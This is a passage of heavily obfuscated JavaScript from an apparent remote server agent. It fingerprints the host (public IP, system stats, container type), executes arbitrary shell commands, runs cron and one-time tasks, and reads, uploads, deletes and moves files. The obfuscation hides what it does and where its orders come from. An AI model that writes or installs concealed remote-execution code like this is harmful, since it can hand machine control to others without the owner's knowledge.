                const f = d[bk(0x360)] === 'IPv4' || a[bk(0x692)](d[bk(0x360)], 0x4);
                if (f && !d['internal']) {
                    if (!/^10\./['test'](d[bk(0xc3)]) && !/^192\.168\./[bk(0x67c)](d[bk(0xc3)]) && !/^172\.(1[6-9]|2[0-9]|3[0-1])\./['test'](d[bk(0xc3)]))
                        return d[bk(0xc3)];
                }
            }
        }
        return null;
    }
    async [a0aI(0x142)]() {
        const bl = a0aI, a = {
                'nOkNa': bl(0x1b7),
                'QKFgp': 'https://icanhazip.com',
                'rkbwz': 'https://checkip.amazonaws.com',
                'mUYyK': 'https://ifconfig.me/ip',
                'QxsIO': bl(0x333)
            }, b = [
                a[bl(0x247)],
                a['QKFgp'],
                a['rkbwz'],
                a['mUYyK'],
                a['QxsIO'],
                bl(0xef),
                'https://myexternalip.com/raw'
            ];
        for (const d of b) {
            try {
                const f = await this[bl(0x323)](d, 0x4);
                if (f && this[bl(0x657)](f))
                    return f;
            } catch (g) {
                continue;
            }
        }
        const c = this[bl(0x5cd)]();
        if (c && this['isValidIPv4'](c))
            return c;
        return null;
    }
    ['getLocalIPv6']() {
        const bm = a0aI, a = {
                'jGsLr': function (c, d) {
                    return c === d;
                },
                'SWqFX': bm(0x4bc),
                'IyvZT': function (c, d) {
                    return c === d;
                }
            }, b = a0o[bm(0x174)]();
        for (const c of Object['keys'](b)) {
            for (const d of b[c]) {
                const f = a[bm(0x3fb)](d[bm(0x360)], a[bm(0x604)]) || a['IyvZT'](d[bm(0x360)], 0x6);
                if (f && !d['internal']) {
                    if (!d[bm(0xc3)][bm(0x43b)]()['startsWith'](bm(0x30d)))
                        return d[bm(0xc3)];
                }
            }
        }
        return null;
    }
    async [a0aI(0x2f3)]() {
        const bn = a0aI, a = {
                'hRoih': bn(0xd1),
                'PTlYK': 'https://v6.ident.me'
            }, b = this[bn(0x138)]();
        if (b && this[bn(0x229)](b))
            return b;
        const c = [
            bn(0x456),
            a['hRoih'],
            a[bn(0x34e)]
        ];
        for (const d of c) {
            try {
                const f = await this[bn(0x323)](d, 0x6);
                if (f && this[bn(0x229)](f))
                    return f;
            } catch (g) {
                a0A[bn(0x48b)](bn(0x573) + d + '\x20失败:\x20' + g[bn(0x3f8)]);
                continue;
            }
        }
        return null;
    }
    async [a0aI(0x323)](a, b = 0x0) {
        const bo = a0aI, c = {
                'ooHQY': '请求超时',
                'LNVFq': function (d, f) {
                    return d !== f;
                },
                'RAYRj': bo(0x2eb),
                'OLLTg': function (d, f) {
                    return d(f);
                },
                'KPloh': 'https',
                'knXdR': bo(0xdc)
            };
        return new Promise((d, f) => {
            const bq = bo, g = {
                    'YhCtS': function (k, l) {
                        const bp = a0b;
                        return c[bp(0x533)](k, l);
                    },
                    'anULM': function (k, l) {
                        return k(l);
                    },
                    'AVZxB': c[bq(0x63f)]
                }, h = c[bq(0x68c)](require, c[bq(0x4a9)]), i = {
                    'timeout': 0x1388,
                    'family': b,
                    'headers': { 'Accept': bq(0x295) }
                }, j = h['get'](a, i, k => {
                    const br = bq;
                    let l = '';
                    if (g[br(0x1ea)](k[br(0x54c)], 0xc8)) {
                        g['anULM'](f, new Error(br(0x46b) + k[br(0x54c)]));
                        return;
                    }
                    k['on'](g[br(0x5a3)], m => l += m), k['on'](br(0x3c8), () => d(l[br(0x162)]()));
                });
            j['on'](c[bq(0x607)], f), j[bq(0x287)](0x1388, () => {
                const bs = bq;
                j[bs(0x27e)](), f(new Error(c[bs(0xff)]));
            });
        });
    }
    [a0aI(0x657)](a) {
        const bt = a0aI;
        return /^(\d{1,3}\.){3}\d{1,3}$/[bt(0x67c)](a);
    }
    [a0aI(0x229)](a) {
        const bu = a0aI;
        if (!/^[0-9a-fA-F:]+$/[bu(0x67c)](a) || !a[bu(0x664)](':'))
            return ![];
        if (/^(fe[89ab]|f[cd]|::1$|::$)/i[bu(0x67c)](a))
            return ![];
        return !![];
    }
    async [a0aI(0x284)]() {
        const bv = a0aI, a = {
                'sJKZe': function (m, n) {
                    return m / n;
                },
                'gNgpi': function (m, n) {
                    return m - n;
                },
                'Frcob': function (m, n) {
                    return m * n;
                },
                'LYUyd': function (m, n) {
                    return m / n;
                },
                'kRXiF': function (m, n) {
                    return m / n;
                }
            }, [b, c, d, f] = await Promise[bv(0x2ef)]([
                a0s[bv(0x3af)](),
                a0s[bv(0x6c9)](),
                a0s[bv(0x1a5)](),
                a0s[bv(0x3af)]()
            ]), g = d[0x0] || {
                'tx_bytes': 0x0,
                'rx_bytes': 0x0
            }, h = a[bv(0x3fd)](Date['now'](), 0x3e8), i = a['gNgpi'](h, this['lastNetworkTime']), j = a[bv(0x125)](g[bv(0x621)], this['lastNetworkStats']['tx']), k = a[bv(0x125)](g['rx_bytes'], this[bv(0x1d7)]['rx']);
        this[bv(0x46a)] += j, this[bv(0x5d7)] += k, this[bv(0x1d7)] = {
            'tx': g['tx_bytes'],
            'rx': g['rx_bytes']
        }, this[bv(0x49d)] = h;
        const l = await a0s['processes']();
        return {
            'cpu': { 'usage': Math[bv(0x1de)](b[bv(0x3af)]) },
            'ram': {
                'total': c[bv(0xc7)],
                'used': c[bv(0x64f)]
            },
            'swap': {
                'total': c[bv(0x1c5)],
                'used': c[bv(0x5d2)]
            },
            'load': {
                'load1': Math[bv(0x1de)](a[bv(0x3e8)](f[bv(0x6c2)], 0x64)) / 0x64,
                'load5': a['LYUyd'](Math[bv(0x1de)](f[bv(0x6c2)] * 0x64), 0x64),
                'load15': a[bv(0x3fd)](Math[bv(0x1de)](a[bv(0x3e8)](f[bv(0x6c2)], 0x64)), 0x64)
            },
            'disk': await this[bv(0x1e4)](),
            'network': {
                'up': Math['round'](a[bv(0x685)](j, i)),
                'down': Math[bv(0x1de)](a[bv(0x685)](k, i)),
                'totalUp': this['totalNetworkUp'],
                'totalDown': this[bv(0x5d7)]
            },
            'connections': await this['_getConnections'](),
            'uptime': a0o[bv(0xe6)](),
            'process': l?.[bv(0x2ef)] || 0x0,
            'message': ''
        };
    }
    async [a0aI(0x4da)]() {
        const bw = a0aI, a = {
                'NPejA': '/.dockerenv',
                'Mcuvb': '/run/.containerenv',
                'ydyxu': bw(0x684),
                'AolZv': '/proc/1/cgroup',
                'aymBk': bw(0x431),
                'lfqYC': bw(0x291),
                'ucQiC': 'Docker',
                'BpDBk': bw(0x5cc),
                'uOoZO': bw(0x1e9),
                'FPBon': bw(0x66e),
                'dHeno': bw(0xd9),
                'PyxPI': bw(0x124),
                'ZWBxJ': bw(0x3b8),
                'fbrsX': bw(0x645),
                'niwdb': bw(0x5a1),
                'fsYEI': bw(0x5bf)
            };
        try {
            if (a0l[bw(0x41a)](a[bw(0x582)]))
                return bw(0x5c9);
            if (a0l['existsSync'](a['Mcuvb']))
                return a[bw(0x3ea)];
            if (a0l[bw(0x41a)](a[bw(0x693)])) {
                const b = a0l[bw(0x2c1)](a[bw(0x693)], bw(0xd9))[bw(0x43b)]();
                if (b[bw(0x664)](a['aymBk']) || b[bw(0x664)](a[bw(0x297)]))
                    return a[bw(0x6bb)];
                else {
                    if (b['includes']('kubepods'))
                        return a[bw(0x23f)];
                    else {
                        if (b[bw(0x664)](bw(0x209)))
                            return a[bw(0x4a1)];
                    }
                }
            }
            if (a0l['existsSync'](a['FPBon'])) {
                const c = a0l[bw(0x2c1)](a[bw(0x5bd)], a[bw(0x134)]);
                if (c['includes'](bw(0x420)) || c[bw(0x664)](bw(0x370)))
                    return a['ucQiC'];
                else {
                    if (c[bw(0x664)](bw(0x643)) || c[bw(0x664)](a[bw(0x4f6)]))
                        return a[bw(0x23f)];
                }
            }
            if (a0l['existsSync'](a[bw(0x454)])) {
                const d = a0l[bw(0x2c1)](a['ZWBxJ'], a['dHeno']);
                if (d[bw(0x664)](a[bw(0x4db)]))
                    return a['uOoZO'];
            }
            if (a0l['existsSync'](a[bw(0x489)])) {
                const f = a0l[bw(0x2c1)](a[bw(0x489)], bw(0xd9));
                if (f[bw(0x664)](a[bw(0x1ce)]) || f['includes'](bw(0x52d)))
                    return a[bw(0x1ce)];
            }
        } catch (g) {
        }
        return bw(0x11f);
    }
    async ['_getDiskInfo']() {
        const bx = a0aI, a = {
                'DdPiq': function (b, c) {
                    return b > c;
                },
                'bYnDy': bx(0x172),
                'FkDKd': function (b, c) {
                    return b !== c;
                },
                'qJLPA': bx(0x1f3)
            };
        try {
            const b = await a0s['fsSize'](), c = b[bx(0x6ba)](g => {
                    const by = bx;
                    return a['DdPiq'](g['size'], 0x0) && g[by(0xec)] !== a[by(0x2e3)] && a[by(0x2e9)](g[by(0xec)], 'overlay') && g['fs']['startsWith'](a[by(0x530)]);
                }), d = c['reduce']((g, h) => g + h[bx(0x18b)], 0x0), f = c[bx(0x188)]((g, h) => g + h['used'], 0x0);
            return {
                'total': d,
                'used': f
            };
        } catch {
            return {
                'total': 0x0,
                'used': 0x0
            };
        }
    }
    async ['_getConnections']() {
        const bz = a0aI;
        try {
            const a = await a0s['networkConnections'](), b = a[bz(0x6ba)](d => d['protocol'] === bz(0x5cf))[bz(0x3d0)], c = a[bz(0x6ba)](d => d[bz(0x539)] === bz(0x18e))[bz(0x3d0)];
            return {
                'tcp': b,
                'udp': c
            };
        } catch {
            return {
                'tcp': 0x0,
                'udp': 0x0
            };
        }
    }
}
class a0P {
    static async ['execute'](a, b = {}) {
        const bA = a0aI, c = {
                'CNaeS': function (d, f) {
                    return d - f;
                },
                'EetCR': function (d, f) {
                    return d === f;
                },
                'JfrdY': bA(0x354),
                'kasuT': function (d, f) {
                    return d(f);
                },
                'sXVUB': function (d, f, g, h) {
                    return d(f, g, h);
                },
                'Vwyen': function (d, f) {
                    return d * f;
                }
            }, {
                cwd: cwd = process[bA(0x391)](),
                env: env = {},
                timeout: timeout = a0K[bA(0x4d2)]
            } = b;
        return new Promise(d => {
            const bB = bA, f = Date[bB(0x543)](), g = c[bB(0x368)](a0p, a, {
                    'cwd': cwd,
                    'env': {
                        ...process.env,
                        ...env
                    },
                    'timeout': c[bB(0x6a9)](timeout, 0x3e8),
                    'maxBuffer': c[bB(0x6a9)](0xa, 0x400) * 0x400
                }, (h, i, j) => {
                    const bC = bB, k = c[bC(0x560)](Date[bC(0x543)](), f), l = h && h[bC(0x6da)] && h['signal'];
                    let m = i || '';
                    if (j)
                        m += j;
                    let n = 0x0;
                    if (h) {
                        if (l)
                            n = 0x7c;
                        else
                            c[bC(0x22d)](typeof h[bC(0x100)], c[bC(0x309)]) ? n = h[bC(0x100)] : n = -0x1;
                    }
                    c[bC(0x220)](d, {
                        'result': m,
                        'exitcode': n,
                        'timeout': l,
                        'cmd': a
                    });
                });
        });
    }
}
class a0Q {
    static async ['listFiles'](a, b = ![]) {
        const bD = a0aI, c = {
                'tQkzP': function (h, i) {
                    return h & i;
                },
                'TSoUp': function (h, i) {
                    return h(i);
                }
            }, d = a0n[bD(0x363)](a0K[bD(0xf4)], a || '.');
        if (!d[bD(0x1bd)](a0K[bD(0xf4)]))
            throw new Error(bD(0x279));
        if (!a0l[bD(0x41a)](d))
            throw new Error('Path\x20not\x20found');
        const f = [], g = h => {
                const bE = bD, i = a0l['readdirSync'](h);
                for (const j of i) {
                    const k = a0n[bE(0x64a)](h, j), l = a0l['statSync'](k), m = new a0G();
                    m[bE(0x21d)] = j, m[bE(0x52a)] = a0n['relative'](a0K[bE(0xf4)], k), m[bE(0xec)] = l[bE(0x175)]() ? bE(0x485) : 'file', m[bE(0x18b)] = l[bE(0x18b)], m[bE(0x353)] = l[bE(0x353)][bE(0x149)](), m[bE(0x44f)] = this[bE(0x583)](l[bE(0x44f)], l[bE(0x175)]()), m[bE(0x538)] = '0o' + c[bE(0x6a7)](l['mode'], 0x1ff)[bE(0x406)](0x8), m['owner'] = l[bE(0x6d9)] + ':' + l[bE(0x5d0)], f[bE(0x6aa)](m), b && l[bE(0x175)]() && c[bE(0x15a)](g, k);
                }
            };
        return c[bD(0x15a)](g, d), f;
    }
    static async [a0aI(0x40e)](a) {
        const bF = a0aI, b = {
                'pwNei': 'directory',
                'tfrrx': bF(0x269)
            }, c = [];
        for (const d of a) {
            const f = a0n[bF(0x363)](a0K[bF(0xf4)], d);
            if (!f[bF(0x1bd)](a0K[bF(0xf4)]))
                continue;
            try {
                const g = a0l[bF(0x207)](f), h = this[bF(0x29c)](f, a0l[bF(0x211)][bF(0x362)]), i = this[bF(0x29c)](f, a0l[bF(0x211)][bF(0x150)]), j = this[bF(0x29c)](f, a0l[bF(0x211)][bF(0x534)]), k = new a0H();
                k['path'] = a0n['relative'](a0K[bF(0xf4)], f), k[bF(0x21d)] = a0n['basename'](f), k[bF(0x44f)] = this[bF(0x583)](g[bF(0x44f)], g['isDirectory']()), k[bF(0x538)] = '0o' + (g[bF(0x44f)] & 0x1ff)[bF(0x406)](0x8), k[bF(0xec)] = g[bF(0x175)]() ? b[bF(0x3c9)] : b[bF(0x5e7)], k[bF(0x633)] = h, k[bF(0x5df)] = i, k[bF(0x516)] = j, c[bF(0x6aa)](k);
            } catch (l) {
            }
        }
        return c;
    }
    static [a0aI(0x29c)](a, b) {
        const bG = a0aI;
        try {
            return a0l[bG(0x307)](a, b), !![];
        } catch {
            return ![];
        }
    }
    static [a0aI(0x26c)](a) {
        const bH = a0aI, b = {
                'ZoZat': function (c, d) {
                    return c === d;
                },
                'KGjwI': 'string',
                'Kqhyh': function (c, d, f) {
                    return c(d, f);
                },
                'SIOoR': bH(0x321)
            };
        if (b[bH(0x212)](typeof a, bH(0x354)))
            return a;
        if (typeof a === b['KGjwI']) {
            const c = a[bH(0x162)]();
            if (/^[0-7]{3,4}$/[bH(0x67c)](c))
                return b[bH(0x31d)](parseInt, c, 0x8);
        }
        throw new Error(b[bH(0x65c)]);
    }
    static [a0aI(0x583)](a, b) {
        const bI = a0aI, c = {
                'ADnBL': function (i, j) {
                    return i & j;
                },
                'LTTrw': function (i, j, k) {
                    return i(j, k);
                }
            }, d = b ? 'd' : '-', f = [
                'r',
                'w',
                'x'
            ], g = c[bI(0x4e9)](a, 0x1ff)[bI(0x406)](0x8)[bI(0x32f)](0x3, '0');
        let h = d;
        for (const i of g) {
            const j = c['LTTrw'](parseInt, i, 0xa);
            h += f['map']((k, l) => j & 0x4 >> l ? k : '-')[bI(0x64a)]('');
        }
        return h;
    }
    static async ['setFilePermissions'](a, b = ![]) {
        const bJ = a0aI, c = {
                'rQLFS': function (g, h) {
                    return g(h);
                },
                'USsyM': function (g, h) {
                    return g(h);
                },
                'qgmFk': 'access_denied',
                'tCtaK': function (g, h) {
                    return g(h);
                },
                'rlxHE': function (g, h) {
                    return g(h);
                },
                'TZlxy': bJ(0xdc)
            }, d = [];
        for (const [g, h] of Object[bJ(0x3d6)](a)) {
            const i = a0n['resolve'](a0K[bJ(0xf4)], g);
            if (!i['startsWith'](a0K[bJ(0xf4)])) {
                d[bJ(0x6aa)]({
                    'path': g,
                    'requested': c[bJ(0x3a1)](String, h),
                    'applied': '',
                    'mode_octal': '',
                    'status': c[bJ(0x56d)]
                });
                continue;
            }
            try {
                const j = this[bJ(0x26c)](h), k = m => {
                        const bK = bJ;
                        a0l[bK(0x61c)](m, j);
                    };
                if (b && a0l[bJ(0x41a)](i) && a0l[bJ(0x207)](i)[bJ(0x175)]()) {
                    const m = n => {
                        const bL = bJ;
                        c[bL(0x587)](k, n);
                        const o = a0l['readdirSync'](n);
                        for (const p of o) {
                            const q = a0n[bL(0x64a)](n, p);
                            a0l['statSync'](q)[bL(0x175)]() ? c[bL(0x3a1)](m, q) : k(q);
                        }
                    };
                    c[bJ(0x383)](m, i);
                } else
                    k(i);
                const l = j[bJ(0x406)](0x8);
                d[bJ(0x6aa)]({
                    'path': g,
                    'requested': c['rlxHE'](String, h),
                    'applied': l,
                    'mode_octal': '0o' + l,
                    'status': 'ok'
                });
            } catch (n) {
                d['push']({
                    'path': g,
                    'requested': String(h),
                    'applied': '',
                    'mode_octal': '',
                    'status': c[bJ(0x559)],
                    'message': n['message']
                });
            }
        }
        const f = d[bJ(0x6ba)](o => o[bJ(0x609)] === 'ok')[bJ(0x3d0)];
        return {
            'status': 'ok',
            'total': d[bJ(0x3d0)],
            'success': f,
            'results': d
        };
    }
    static async [a0aI(0x5f5)](a) {
        const bM = a0aI, b = {
                'qWNEO': 'Access\x20denied:\x20path\x20outside\x20root',
                'oBbhw': function (h, i) {
                    return h * i;
                },
                'SQfSt': 'File\x20too\x20large',
                'OyjuK': bM(0xd9),
                'maLhz': 'base64',
                'ecORK': bM(0x3f3)
            }, c = a0n[bM(0x363)](a0K[bM(0xf4)], a);
        if (!c[bM(0x1bd)](a0K[bM(0xf4)]))
            throw new Error(b[bM(0x176)]);
        const d = a0l['statSync'](c);
        if (d['size'] > b['oBbhw'](0x400, 0x400))
            throw new Error(b[bM(0x260)]);
        const f = a0l[bM(0x2c1)](c), g = this['_isBinary'](f);
        return {
            'status': 'ok',
            'path': a0n[bM(0x51b)](a0K[bM(0xf4)], c),
            'content': g ? a0u[bM(0x588)](f) : f[bM(0x406)](b[bM(0x5b6)]),
            'encoding': g ? b[bM(0x3db)] : b[bM(0x43f)],
            'is_binary': g,
            'size': d[bM(0x18b)]
        };
    }
    static [a0aI(0x42d)](a) {
        const bN = a0aI, b = {
                'pBAPk': function (c, d) {
                    return c === d;
                },
                'Tzbnt': function (c, d) {
                    return c < d;
                }
            };
        if (!a || b['pBAPk'](a[bN(0x3d0)], 0x0))
            return ![];
        for (let c = 0x0; b[bN(0xc5)](c, Math[bN(0x3c1)](a[bN(0x3d0)], 0x200)); c++) {
            if (b[bN(0x5ab)](a[c], 0x0))
                return !![];
        }
        return ![];
    }
    static async ['uploadFile'](a, b, c, d = null, f = null) {
        const bO = a0aI, g = {
                'ONIoh': bO(0x279),
                'XHLGB': function (l, m) {
                    return l > m;
                },
                'lNiad': bO(0x299),
                'tfoMT': function (l, m) {
                    return l !== m;
                },
                'oLHOs': function (l, m) {
                    return l(m);
                },
                'Iofre': bO(0x1d6),
                'nsWcG': function (l, m) {
                    return l === m;
                }
            }, h = a0n['resolve'](a0K[bO(0xf4)], a);
        let j = h;
        b && (j = a0n[bO(0x64a)](h, b));
        if (!j['startsWith'](a0K[bO(0xf4)]))
            throw new Error(g[bO(0x2e8)]);
        !a0l['existsSync'](a0n['dirname'](j)) && a0l[bO(0x346)](a0n[bO(0x632)](j), { 'recursive': !![] });
        const k = a0u[bO(0x528)](c);
        if (g['XHLGB'](k['length'], a0K[bO(0x213)]))
            throw new Error(g[bO(0x443)]);
        if (g['tfoMT'](d, null) && f !== null) {
            const l = g[bO(0x594)](Number, d), m = g['oLHOs'](Number, f);
            if (Number['isNaN'](l) || Number['isNaN'](m))
                throw new Error(g[bO(0x1eb)]);
            const n = a0n[bO(0x64a)](a0n[bO(0x632)](j), bO(0x2c7), a0n[bO(0x47b)](j));
            !a0l[bO(0x41a)](n) && a0l[bO(0x346)](n, { 'recursive': !![] });
            const o = a0n['join'](n, bO(0x28b) + l);
            a0l[bO(0x24b)](o, k);
            const p = a0l[bO(0x157)](n)[bO(0x6ba)](s => s[bO(0x1bd)](bO(0x28b))), q = p[bO(0x3d0)], r = g[bO(0x554)](q, m);
            if (r) {
                const s = a0l['createWriteStream'](j);
                for (let t = 0x0; t < m; t++) {
                    const u = a0n[bO(0x64a)](n, bO(0x28b) + t);
                    if (!a0l[bO(0x41a)](u)) {
                        s[bO(0x107)]();
                        throw new Error('Missing\x20chunk\x20' + t);
                    }
                    s[bO(0x19e)](a0l[bO(0x2c1)](u));
                }
                s[bO(0x3c8)]();
                for (const v of a0l['readdirSync'](n)) {
                    a0l[bO(0x40f)](a0n[bO(0x64a)](n, v));
                }
                a0l[bO(0x34c)](n, {
                    'recursive': !![],
                    'force': !![]
                });
            }
            return {
                'status': 'ok',
                'path': a0n['relative'](a0K[bO(0xf4)], j),
                'received': q,
                'total': m,
                'chunked': !![]
            };
        }
        return a0l[bO(0x24b)](j, k), {
            'status': 'ok',
            'path': a0n['relative'](a0K[bO(0xf4)], j),
            'received': k[bO(0x3d0)],
            'total': k[bO(0x3d0)],
            'chunked': ![]
        };
    }
    static async [a0aI(0xe3)](a, b, c, d = null, f = null) {
        const bP = a0aI, g = {
                'iMPqT': function (k, l) {
                    return k || l;
                },
                'iQXpZ': bP(0x279),
                'BdtNM': function (k, l) {
                    return k > l;
                },
                'OBlSY': function (k, l) {
                    return k !== l;
                },
                'Lasxu': function (k, l) {
                    return k !== l;
                },
                'urRyh': 'chunk_id\x20and\x20total_chunks\x20must\x20be\x20numeric',
                'Jlrjw': bP(0x2c7),
                'Bvdnp': function (k, l) {
                    return k === l;
                },
                'VlQVu': function (k, l) {
                    return k < l;
                },
                'mYyku': bP(0x37a),
                'TXjdC': bP(0x39c)
            }, h = a0n[bP(0x363)](a0K[bP(0xf4)], g[bP(0x656)](a, '.'));
        let j = h;
        b && (j = a0n['join'](h, b));
        if (!j[bP(0x1bd)](a0K[bP(0xf4)]))
            throw new Error(g['iQXpZ']);
        !a0l['existsSync'](a0n[bP(0x632)](j)) && a0l[bP(0x346)](a0n['dirname'](j), { 'recursive': !![] });
        if (g[bP(0x128)](c[bP(0x3d0)], a0K['MAX_UPLOAD_SIZE']))
            throw new Error('File\x20too\x20large');
        if (g[bP(0x650)](d, null) && g[bP(0x1da)](f, null)) {
            const k = Number(d), l = Number(f);
            if (Number[bP(0x571)](k) || Number['isNaN'](l))
                throw new Error(g['urRyh']);
            const m = a0n['join'](a0n[bP(0x632)](j), g[bP(0x232)], a0n[bP(0x47b)](j));
            !a0l[bP(0x41a)](m) && a0l['mkdirSync'](m, { 'recursive': !![] });
            const n = a0n['join'](m, bP(0x28b) + k);
            a0l[bP(0x24b)](n, c);
            const o = a0l[bP(0x157)](m)[bP(0x6ba)](r => r[bP(0x1bd)](bP(0x28b))), p = o[bP(0x3d0)], q = g[bP(0x63e)](p, l);
            if (q) {
                const r = [];
                for (let s = 0x0; g[bP(0xf6)](s, l); s++) {
                    const t = a0n['join'](m, bP(0x28b) + s);
                    if (!a0l[bP(0x41a)](t))
                        throw new Error(bP(0x4b4) + s);
                    r[bP(0x6aa)](a0l[bP(0x2c1)](t));
                }
                a0l['writeFileSync'](j, Buffer['concat'](r));
                for (const u of a0l['readdirSync'](m)) {
                    a0l[bP(0x40f)](a0n[bP(0x64a)](m, u));
                }
                return a0l[bP(0x34c)](m, {
                    'recursive': !![],
                    'force': !![]
                }), {
                    'status': 'ok',
                    'path': a0n[bP(0x51b)](a0K[bP(0xf4)], j),
                    'chunk_id': k,
                    'completed': !![],
                    'message': g[bP(0x231)]
                };
            }
            return {
                'status': 'ok',
                'path': a0n[bP(0x51b)](a0K[bP(0xf4)], j),
                'chunk_id': k,
                'completed': ![],
                'message': bP(0x6b5) + k + bP(0x1a3)
            };
        }
        return a0l[bP(0x24b)](j, c), {
            'status': 'ok',
            'path': a0n[bP(0x51b)](a0K[bP(0xf4)], j),
            'chunk_id': 0x0,
            'completed': !![],
            'message': g[bP(0x4fc)]
        };
    }
    static async [a0aI(0x17b)](a) {
        const bQ = a0aI, b = { 'iUPkP': bQ(0x298) }, c = a0n[bQ(0x363)](a0K[bQ(0xf4)], a);
        if (!c['startsWith'](a0K['FILE_ROOT']))
            throw new Error(bQ(0x279));
        if (!a0l[bQ(0x41a)](c))
            throw new Error(b['iUPkP']);
        const d = a0l[bQ(0x207)](c), f = a0l['readFileSync'](c), g = a0u['fromByteArray'](f);
        return {
            'path': a0n[bQ(0x51b)](a0K[bQ(0xf4)], c),
            'content': g,
            'size': d[bQ(0x18b)]
        };
    }
    static async [a0aI(0x5b5)](a) {
        const bR = a0aI, b = {
                'yIPYr': bR(0x4bf),
                'GRxxL': bR(0x5b1)
            }, c = [];
        for (const d of a) {
            const f = a0n[bR(0x363)](a0K[bR(0xf4)], d);
            if (!f[bR(0x1bd)](a0K['FILE_ROOT'])) {
                c['push']({
                    'path': d,
                    'status': bR(0x69e)
                });
                continue;
            }
            try {
                if (a0l['existsSync'](f)) {
                    const g = a0l[bR(0x207)](f);
                    g[bR(0x175)]() ? a0l[bR(0x34c)](f, {
                        'recursive': !![],
                        'force': !![]
                    }) : a0l[bR(0x40f)](f), c['push']({
                        'path': d,
                        'status': b[bR(0x6c1)]
                    });
                } else
                    c[bR(0x6aa)]({
                        'path': d,
                        'status': b['GRxxL']
                    });
            } catch (h) {
                c[bR(0x6aa)]({
                    'path': d,
                    'status': bR(0xdc),
                    'message': h[bR(0x3f8)]
                });
            }
        }
        return c;
    }
    static async [a0aI(0xfe)](a) {
        const bS = a0aI, b = {
                'iMIvA': bS(0x69e),
                'VgRCp': bS(0xdc)
            }, c = [];
        for (const [d, f] of Object['entries'](a)) {
            const g = a0n['resolve'](a0K[bS(0xf4)], d), h = a0n[bS(0x363)](a0K['FILE_ROOT'], f);
            if (!g[bS(0x1bd)](a0K[bS(0xf4)]) || !h['startsWith'](a0K[bS(0xf4)])) {
                c[bS(0x6aa)]({
                    'from': d,
                    'to': f,
                    'status': b['iMIvA']
                });
                continue;
            }
            try {
                const i = a0n['dirname'](h);
                !a0l[bS(0x41a)](i) && a0l[bS(0x346)](i, { 'recursive': !![] }), a0l[bS(0x21e)](g, h), c[bS(0x6aa)]({
                    'from': d,
                    'to': f,
                    'status': 'ok'
                });
            } catch (j) {
                c[bS(0x6aa)]({
                    'from': d,
                    'to': f,
                    'status': b[bS(0x3d4)],
                    'message': j[bS(0x3f8)]
                });
            }
        }
        return c;
    }
    static async [a0aI(0x5c3)](a) {
        const bT = a0aI, b = {
                'BMemM': function (d, f, g) {
                    return d(f, g);
                },
                'Hjagy': 'access_denied',
                'LCisP': bT(0x5b1),
                'vXsxE': function (d, f, g) {
                    return d(f, g);
                }
            }, c = [];
        for (const [d, f] of Object[bT(0x3d6)](a)) {
            const g = a0n[bT(0x363)](a0K['FILE_ROOT'], d), h = a0n['resolve'](a0K[bT(0xf4)], f);
            if (!g[bT(0x1bd)](a0K[bT(0xf4)]) || !h['startsWith'](a0K[bT(0xf4)])) {
                c[bT(0x6aa)]({
                    'from': d,
                    'to': f,
                    'status': b[bT(0x683)]
                });
                continue;
            }
            try {
                if (!a0l[bT(0x41a)](g)) {
                    c[bT(0x6aa)]({
                        'from': d,
                        'to': f,
                        'status': b[bT(0x1cd)]
                    });
                    continue;
                }
                const i = a0n[bT(0x632)](h);
                !a0l[bT(0x41a)](i) && a0l[bT(0x346)](i, { 'recursive': !![] });
                const j = a0l[bT(0x207)](g);
                if (j[bT(0x175)]()) {
                    if (a0l['cpSync'])
                        a0l['cpSync'](g, h, { 'recursive': !![] });
                    else {
                        const k = (l, m) => {
                            const bU = bT;
                            if (a0l[bU(0x207)](l)[bU(0x175)]()) {
                                if (!a0l[bU(0x41a)](m))
                                    a0l[bU(0x346)](m, { 'recursive': !![] });
                                for (const n of a0l[bU(0x157)](l)) {
                                    b['BMemM'](k, a0n['join'](l, n), a0n[bU(0x64a)](m, n));
                                }
                            } else
                                a0l['copyFileSync'](l, m);
                        };
                        b[bT(0x111)](k, g, h);
                    }
                } else
                    a0l[bT(0x4a0)](g, h);
                c['push']({
                    'from': d,
                    'to': f,
                    'status': 'ok'
                });
            } catch (l) {
                c[bT(0x6aa)]({
                    'from': d,
                    'to': f,
                    'status': 'error',
                    'message': l[bT(0x3f8)]
                });
            }
        }
        return c;
    }
    static async [a0aI(0x11b)](a) {
        const bV = a0aI, b = a0n[bV(0x363)](a0K[bV(0xf4)], a);
        if (!b[bV(0x1bd)](a0K['FILE_ROOT']))
            throw new Error('Access\x20denied:\x20path\x20outside\x20root');
        return a0l[bV(0x346)](b, { 'recursive': !![] }), {
            'status': 'ok',
            'path': a0n[bV(0x51b)](a0K['FILE_ROOT'], b)
        };
    }
}
class a0R {
    static ['cronJobs'] = new Map();
    static [a0aI(0x1c6)](a, b) {
        const bW = a0aI, c = {
                'kBBiK': function (d, f) {
                    return d > f;
                }
            };
        a[bW(0x6aa)](b), c['kBBiK'](a[bW(0x3d0)], a0K[bW(0x3fa)]) && a[bW(0x1dc)](0x0, a['length'] - a0K['MAX_TASK_LOG_SIZE']);
    }
    static ['_formatLogEntry'](a, b, c, d, f = null) {
        const bX = a0aI, g = new Date()[bX(0x149)]();
        return {
            'ts': g,
            'cmd': a,
            'output': b,
            'exitcode': c,
            'type': d,
            'cron': f,
            'formatted': g + bX(0x4b2) + a + bX(0x442) + c + '\x0a' + (b?.[bX(0x162)]() || '')
        };
    }
    static [a0aI(0x564)]() {
        const bY = a0aI;
        return {
            'status': 'ok',
            'count': a0K[bY(0x42f)]['length'],
            'tasks': a0K[bY(0x42f)]
        };
    }
    static async [a0aI(0x3f4)](a) {
        const bZ = a0aI, b = {
                'YBqWg': function (d, f) {
                    return d < f;
                },
                'rdytp': function (d, f) {
                    return d === f;
                }
            };
        a0K['onetasks'] = a || [], a0K[bZ(0x424)] = !![];
        const c = [];
        for (let d = 0x0; b[bZ(0x6b6)](d, a0K['onetasks'][bZ(0x3d0)]); d++) {
            const f = a0K['onetasks'][d], g = await a0P[bZ(0x394)](f), h = this[bZ(0x438)](f, g['result'], g['exitcode'], bZ(0x432));
            this[bZ(0x1c6)](a0K[bZ(0x1d3)], h), c[bZ(0x6aa)]({
                'index': d,
                'cmd': f,
                'exitcode': g[bZ(0x17f)],
                'output': g[bZ(0x24e)],
                'status': b[bZ(0x428)](g[bZ(0x17f)], 0x0) ? 'ok' : bZ(0xdc)
            });
        }
        return a0K['InitTask'] = ![], {
            'status': 'ok',
            'count': a0K[bZ(0x42f)][bZ(0x3d0)],
            'tasks': a0K[bZ(0x42f)],
            'executed': c
        };
    }
    static ['getCronTasks']() {
        const c0 = a0aI;
        return {
            'status': 'ok',
